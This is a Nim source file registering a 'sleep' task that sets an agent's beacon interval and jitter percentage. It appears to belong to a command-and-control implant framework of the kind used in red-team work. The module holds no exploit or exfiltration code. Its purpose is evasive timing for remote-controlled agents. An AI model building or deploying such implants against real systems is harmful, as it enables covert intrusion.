import std/[json, strutils]
import ../types
import ./registry

proc sleepExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
  let intervalStr = params{"interval"}.getStr("")
  let jitterStr   = params{"jitter"}.getStr("")
  if intervalStr.len == 0:
    return TaskResult(output: "Error: interval required",
                      status: "error", completed: true)
  try:
    state.sleepInterval = parseInt(intervalStr)
    if jitterStr.len > 0:
      state.jitter = parseInt(jitterStr)
    return TaskResult(
      output: "Sleep: " & $state.sleepInterval & "s, jitter: " & $state.jitter & "%",
      status: "success",
      completed: true,
    )
  except ValueError as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initSleep*() =
  register("sleep", sleepExecute)
